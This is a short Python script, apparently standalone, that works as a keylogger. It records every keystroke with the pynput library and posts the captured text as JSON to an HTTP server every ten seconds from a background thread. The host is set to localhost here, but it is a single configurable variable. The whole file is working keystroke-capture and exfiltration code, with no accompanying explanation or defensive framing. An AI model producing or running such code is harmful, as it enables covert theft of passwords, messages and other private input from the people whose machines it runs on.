from pynput import keyboard
import requests
import json
import threading
import time

text = ""

host = "localhost"
port = "8000"

time_interval = 10

def send_to_server():
    global text
    while True:
        if text:
            try:
                payload = json.dumps({"loggedTexts": text})
                req = requests.post(f"http://{host}:{port}", data=payload, headers={"Content-Type": "application/json"})
                print(f"Sent data: {text}")
                text = ""  # Clear text after sending
            except Exception as e:
                print(f"Couldn't complete request: {e}")
        time.sleep(time_interval)

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace:
        text = text[:-1] if len(text) > 0 else text
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


server_thread = threading.Thread(target=send_to_server)
server_thread.daemon = True
server_thread.start()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
